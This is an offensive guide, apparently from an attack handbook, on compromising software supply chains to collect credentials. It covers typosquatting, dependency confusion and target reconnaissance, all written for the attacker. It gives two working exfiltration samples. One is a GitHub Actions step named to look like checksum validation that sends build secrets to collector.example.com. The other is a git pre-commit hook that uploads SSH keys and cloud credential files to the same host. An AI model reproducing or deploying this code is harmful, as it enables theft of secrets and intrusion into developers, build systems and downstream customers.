# Supply chain as a collection vector

Compromising a dependency, build pipeline, or development tool gives collection
access that scales across every organisation consuming that component. Rather
than targeting one organisation's endpoint, a single supply chain compromise
reaches hundreds of targets simultaneously.

## Why it works

Software supply chains are built on trust. A package on PyPI is trusted by
every project that imports it. A Docker base image is trusted by every
container built from it. A GitHub Action is trusted by every pipeline that
uses it. That trust is rarely verified cryptographically, and the tooling
to audit it is rarely deployed.

## Package repository poisoning

Typosquatting and dependency confusion place malicious packages where build
systems will pull them automatically.

Typosquatting targets common naming errors:

```text
# legitimate: requests
# typosquatted: request, requestz, requets

# legitimate: boto3
# typosquatted: bto3, boto-3

# check if a name is available before publishing a look-alike
pip search PACKAGE_NAME  # or check pypi.org directly
```

Dependency confusion exploits the behaviour of package managers that prefer
public registries over private ones when a package name exists in both:

```text
# if an organisation uses a private registry with package 'internal-utils'
# and that name does not exist on the public PyPI:
# publish 'internal-utils' to the public PyPI with a higher version number
# pip will pull the public version instead of the private one
```

## CI/CD pipeline abuse

Build pipelines run with credentials to deploy to production. A malicious
step added to a pipeline definition collects those credentials and any
secrets accessible during the build.

```yaml
# GitHub Actions: malicious step buried among legitimate ones
# placed to run after legitimate steps that load secrets
- name: Validate dependency checksums
  run: |
    python3 -c "
    import os, urllib.request, json
    secrets = {k: v for k, v in os.environ.items()
               if any(t in k for t in ['TOKEN','SECRET','KEY','PASSWORD','AWS','AZURE'])}
    urllib.request.urlopen(urllib.request.Request(
        'https://collector.example.com/harvest',
        data=json.dumps(secrets).encode(),
        headers={'Content-Type': 'application/json'}
    ))
    " 2>/dev/null || true
```

The `|| true` prevents the step from failing the build if the collection
endpoint is unreachable.

## Developer tooling compromise

IDE extensions, CLI tools, and build utilities run in the developer's
context with access to all local credentials, SSH keys, and repository
content.

Targets: VS Code extensions, npm global packages (`npm install -g`),
shell plugins, git hooks.

A malicious git hook runs on every commit:

```bash
# .git/hooks/pre-commit (or installed globally)
#!/bin/bash
# collect SSH keys and cloud credentials silently
for f in ~/.ssh/id_* ~/.aws/credentials ~/.config/gcloud/credentials.db; do
    [[ -f "$f" ]] && curl -sf -X POST https://collector.example.com/keys \
      -F "file=@$f" -F "host=$(hostname)" &>/dev/null &
done
```

## What supply chain access yields

A successful package or pipeline compromise:

- Collects build secrets (cloud credentials, deployment keys, signing certificates)
- Establishes C2 beacons on developer machines and build servers
- Reaches the organisation's production infrastructure through deployment pipelines
- May propagate to the organisation's own customers if the compromised package
  is shipped in a product

## Indicators of a supply chain-aware target

Before attempting a supply chain attack, assess:

- Does the target publish open-source components?
- Do their job postings mention specific internal build tools or registries?
- Are their GitHub Actions using third-party actions pinned to mutable tags
  rather than commit SHAs?
- Do their public repositories reference private package indices?

Public GitHub Actions workflows often expose all of these details without
any authentication.
